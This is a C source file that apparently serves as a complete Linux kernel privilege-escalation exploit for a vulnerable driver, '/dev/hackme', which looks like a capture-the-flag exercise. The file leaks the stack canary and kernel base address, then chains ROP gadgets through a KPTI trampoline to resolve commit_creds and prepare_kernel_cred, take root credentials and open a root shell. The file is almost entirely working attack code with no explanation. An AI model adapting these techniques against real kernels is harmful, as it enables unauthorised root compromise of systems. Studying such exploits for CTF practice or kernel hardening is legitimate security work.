#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

void leak_stack(int, unsigned long *);
void save_state(void);
void fetch_commit(void);
void leak_prep(void);
void fetch_prep(void);
void make_cred(void);
void fetch_cred(void);
void send_cred(void);
void getshell(void);

int fetch;
int fd;

unsigned long user_cs, user_ss, user_sp, user_rflags;
unsigned long commit_creds, prepare_kcred, ksymtab_commit_creds, ksymtab_prepare_kcred;
unsigned long canary, image_base;
unsigned long cred_struct_ptr;

//arbitrary read gadgets
unsigned long pop_rax; //pop rax ; ret
unsigned long mov_eax_pop; //mov eax, dword ptr [rax] ; pop rbp ; ret

//other gadgets
unsigned long kpti_trampoline; //followed by 2 pops
unsigned long pop_rdi;

int main(void)
{
	save_state();
	
	fd = open("/dev/hackme", O_RDWR);
	
	printf("[+]Leaking Stack...\n");
	int size = 50;
	unsigned long buf[size];
	leak_stack(size, buf);

	canary = buf[16];
	image_base = buf[38]-0xa157;

	printf("[+]Canary: %lx\n", canary);
	printf("[+]Image Base: %lx\n", image_base);


	pop_rax = image_base + 0x4d11;
	mov_eax_pop = image_base + 0x15a80;
	kpti_trampoline = image_base + 0x200f26;

	ksymtab_commit_creds = image_base + 0xf87d90;
	ksymtab_prepare_kcred = image_base + 0xf8d4fc;

	//leak commit_creds
	int offset = 16;
	unsigned long payload[50];
	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rax;
	payload[offset++] = ksymtab_commit_creds;
	payload[offset++] = mov_eax_pop;
	payload[offset++] = 0;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_commit;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	write(fd, payload, sizeof(payload));

	return 0;
}

void leak_stack(int size, unsigned long * buf)
{
	read(fd, buf, size*8);
	for (int i = 0; i < size; i++)
		printf("[%d]: %lx\n", i, buf[i]);
}

void save_state(void)
{
	__asm__
	(
	 	".intel_syntax noprefix;"
		
		"mov user_cs, cs;"
		"mov user_ss, ss;"
		"mov user_sp, rsp;"
		"pushf;"
		"pop user_rflags;"

		".att_syntax;"
	);
	printf("[+]State Saved!\n");
}

void fetch_commit(void)
{
	__asm__
	(
 		".intel_syntax noprefix;"

		"mov fetch, eax;"
		
		".att_syntax;"
	);
	commit_creds = ksymtab_commit_creds + fetch;
	printf("[+]commit_creds() Leaked: %lx\n", commit_creds);

	leak_prep();
}

void leak_prep(void)
{
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rax;
	payload[offset++] = ksymtab_prepare_kcred;
	payload[offset++] = mov_eax_pop;
	payload[offset++] = 0;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_prep;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	write(fd, payload, sizeof(payload));
}

void fetch_prep(void)
{
	__asm__
	(
		".intel_syntax noprefix;"
		
		"mov fetch, eax;"

		".att_syntax;"
	);
	prepare_kcred = ksymtab_prepare_kcred + fetch;
	printf("[+]prepare_kernel_cred() Leaked: %lx\n", prepare_kcred);

	make_cred();
}

void make_cred(void)
{
	unsigned long payload[50];
	int offset = 16;
	pop_rdi = image_base + 0x6370;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rdi;
	payload[offset++] = 0;
	payload[offset++] = prepare_kcred;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)fetch_cred;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;

	write(fd, payload, sizeof(payload));
}

void fetch_cred(void)
{
	__asm__
	(
	 	".intel_syntax noprefix;"
		
		"mov cred_struct_ptr, rax;"

		".att_syntax;"
	);
	printf("[+]ptr to cred struct retrieved: %lx\n", cred_struct_ptr);

	send_cred();
}

void send_cred(void)
{
	
	unsigned long payload[50];
	int offset = 16;

	payload[offset++] = canary;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = pop_rdi;
	payload[offset++] = cred_struct_ptr;
	payload[offset++] = commit_creds;
	payload[offset++] = kpti_trampoline;
	payload[offset++] = 0;
	payload[offset++] = 0;
	payload[offset++] = (unsigned long)getshell;
	payload[offset++] = user_cs;
	payload[offset++] = user_rflags;
	payload[offset++] = user_sp;
	payload[offset++] = user_ss;
	
	write(fd, payload, sizeof(payload));
}

void getshell(void)
{
	if (getuid() == 0)
	{
		printf("[+]Exploit Success!\n");
		system("/bin/sh");
	}
	else
		printf("[-]Exploit Unsuccessful.\n");
	exit(0);
}